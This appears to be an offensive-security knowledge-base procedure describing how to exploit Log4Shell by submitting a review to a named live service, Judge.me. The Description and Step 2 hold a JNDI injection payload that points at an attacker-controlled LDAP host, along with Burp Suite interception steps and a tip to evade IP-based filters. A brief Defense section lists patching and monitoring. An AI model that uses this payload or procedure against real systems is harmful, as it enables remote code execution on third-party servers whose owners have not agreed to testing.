---
tags:
  - log4shell
  - rce
  - jndi
  - payload-injection
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Java
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:42.540Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 11f0502c-74e4-42f0-a6d7-e72179927d18
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
---
# Submit-Malicious-Review-Payload-for-Log4Shell

## Summary

This procedure involves submitting a review to Judge.me with a Log4Shell JNDI payload in the content field, leveraging the integrated spam filter to trigger remote code execution on the third-party server.

## Description

The attack targets the review submission endpoint at https://judge.me/reviews, where user input in the content is logged by the vulnerable spam detection service using Apache Log4j < 2.15.0. The payload `${jndi:ldap://attacker-controlled-domain/a}` causes a JNDI lookup during logging, potentially executing arbitrary code if the LDAP server is malicious. This exploits unvalidated user input in a public-facing web application, with impact limited to the partner but demonstrating RCE in supply chains.

## Requirements

1. Spam filter enabled in Judge.me settings
2. Burp Suite configured as a proxy for request interception
3. Attacker-controlled domain set up for callback (e.g., Canarytokens)
4. Different IP from shop's to bypass basic filters

## Defense

Defensive measures and detection strategies:

- Patch Log4j to 2.17.0 or later in all dependencies
- Sanitize and escape user input before logging
- Implement logging without JNDI features or use safe alternatives
- Monitor for anomalous LDAP traffic from application servers

## Objectives

1. Inject JNDI payload to trigger Log4j substitution
2. Achieve LDAP lookup from partner's server
3. Confirm RCE potential without direct Judge.me compromise

## Instructions

### Step 1: Configure Proxy

**Context**: Set up interception to modify the review submission.

Launch Burp Suite and configure your browser to proxy through it (e.g., 127.0.0.1:8080). Enable intercept on the target scope for judge.me.

> This allows capturing and editing the POST request to /reviews.

### Step 2: Prepare and Submit Review

**Context**: Craft the payload in the review content to exploit Log4j.

Navigate to https://judge.me/reviews, fill the form (title, body with `${jndi:ldap://canarytoken-domain/a}`), and submit. Intercept the request in Burp, ensure the payload is in the 'content' parameter, then forward.

> The request should return 200 OK, with the payload logged externally.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[log4shell]]
- [[rce]]
- [[jndi]]
- [[payload-injection]]
